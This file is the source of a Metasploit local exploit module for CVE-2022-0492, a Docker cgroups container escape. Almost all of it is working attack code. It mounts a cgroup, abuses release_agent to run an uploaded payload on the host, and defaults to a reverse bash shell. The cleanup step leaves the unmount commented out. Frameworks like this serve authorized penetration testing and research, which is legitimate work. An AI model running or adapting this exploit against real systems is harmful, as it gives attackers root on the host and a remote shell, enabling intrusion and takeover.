##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html

  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::Kernel
  include Msf::Post::File
  include Msf::Exploit::FileDropper

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Docker cgroups Container Escape',
        'Description' => %q{
          This exploit module illustrates how a vulnerability could be exploited
          in an linux command for priv esc.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Yiqi Sun', # discovery
          'Kevin Wang', # discovery
          'T1erno', # POC
        ],
        'Platform' => [ 'unix', 'linux' ],
        'Arch' => ARCH_CMD,
        'SessionTypes' => ['meterpreter'],
        'Targets' => [[ 'Auto', {} ]],
        'DefaultOptions' => {
          'PAYLOAD' => 'cmd/unix/reverse_bash'
        },
        'Privileged' => true,
        'References' => [
          [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=24f6008564183aa120d07c03d9289519c2fe02af'],
          [ 'URL', 'https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/'],
          [ 'URL', 'https://github.com/T1erno/CVE-2022-0492-Docker-Breakout-Checker-and-PoC'],
          [ 'URL', 'https://github.com/PaloAltoNetworks/can-ctr-escape-cve-2022-0492'],
          [ 'URL', 'https://github.com/SofianeHamlaoui/CVE-2022-0492-Checker/blob/main/escape-check.sh'],
          [ 'URL', 'https://pwning.systems/posts/escaping-containers-for-fun/'],
          [ 'URL', 'https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html'],
          [ 'URL', 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation'],
          [ 'URL', 'https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/'],
          [ 'CVE', '2022-0492']
        ],
        'DisclosureDate' => '2022-02-04',
        'DefaultTarget' => 0,
        # https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_advanced_options [
      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
    ]
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def check
    print_status('Unable to determine host OS, this check method is unlikely to be accurate')
    release = kernel_release
    # https://people.canonical.com/~ubuntu-security/cve/2022/CVE-2022-0492
    release_short = Rex::Version.new(release.split('-').first)
    release_long = Rex::Version.new(release.split('-')[0..1].join('-'))
    if release_short >= Rex::Version.new('5.13.0') && release_long < Rex::Version.new('5.13.0-37.42') || # Ubuntu 21.10
       release_short >= Rex::Version.new('5.4.0') && release_long < Rex::Version.new('5.4.0-105.119') || # Ubuntu 20.04 LTS
       release_short >= Rex::Version.new('4.15.0') && release_long < Rex::Version.new('4.15.0-173.182') || # Ubuntu 18.04 LTS
       release_short >= Rex::Version.new('4.4.0') && release_long < Rex::Version.new('4.4.0-222.255') # Ubuntu 16.04 ESM
      return CheckCode::Vulnerable("IF host OS is Ubuntu, kernel version #{release} is vulnerable")
    end

    CheckCode::Safe("Kernel version #{release} may not be vulnerable depending on the host OS")
  end

  def exploit
    # Check if we're already root as its required
    unless is_root?
      fail_with(Failure::NoAccess,
                'The exploit needs a session as root (uid 0) inside the container')
    end

    # create mount
    @mount_dir = "#{base_dir}/#{rand_text_alphanumeric(5..10)}"
    register_dir_for_cleanup(@mount_dir)
    vprint_status("Creating folder for mount: #{@mount_dir}")
    mkdir(@mount_dir)
    print_status('Mounting cgroup')
    cmd_exec("mount -t cgroup -o rdma cgroup #{@mount_dir}")
    group = rand_text_alphanumeric(5..10).to_s
    group_full_dir = "#{@mount_dir}/#{group}"
    vprint_status("Creating folder in cgroup for exploitation: #{group_full_dir}")
    mkdir(group_full_dir)

    print_status("Enabling notify on release for group #{group}")
    write_file("#{group_full_dir}/notify_on_release", '1')

    print_status('Determining the host OS path for image')
    # for this, we need the line that starts with overlay, and contains an 'upperdir' parameter, which we want the value of
    mtab_file = read_file('/etc/mtab')
    host_path = nil
    mtab_file.each_line do |line|
      next unless line.start_with?('overlay') && line.include?('perdir') # upperdir

      line.split(',').each do |parameter|
        next unless parameter.start_with?('upperdir')

        parameter = parameter.split('=')
        fail_with(Failure::UnexpectedReply, 'Unable to determine docker image path on host OS') unless parameter.length > 1
        host_path = parameter[1]
      end
      break
    end

    fail_with(Failure::UnexpectedReply, 'Unable to determine docker image path on host OS') if host_path.empty? || host_path.nil? || host_path.start_with?('sed') # start_with catches repeat of command

    vprint_status("Host OS path for image: #{host_path}")

    payload_path = "#{base_dir}/#{rand_text_alphanumeric(5..10)}"
    print_status("Setting release_agent path to: #{host_path}#{payload_path}")
    cmd_exec("echo \"#{host_path}#{payload_path}\" > #{@mount_dir}/release_agent")

    print_status("Uploading payload to #{payload_path}")
    write_file(payload_path, payload.encoded)
    # cmd_exec("echo \"#{payload.encoded}\" > #{payload_path}")
    # cmd_exec("chmod a+x #{payload_path}")
    upload_and_chmodx payload_path, payload.encoded
    register_files_for_cleanup(payload_path)

    print_status('Triggering payload')
    puts %(sh -c "echo \$\$ > #{group_full_dir}/cgroup.procs")
    puts cmd_exec(%(sh -c "echo \$\$ > #{group_full_dir}/cgroup.procs"))
  end

  def cleanup
    if @mount_dir
      vprint_status("Cleanup: Unmounting #{@mount_dir}")
      # XXX
      # cmd_exec("umount #{@mount_dir}")
    end
    # XXX
    # super
  end
end
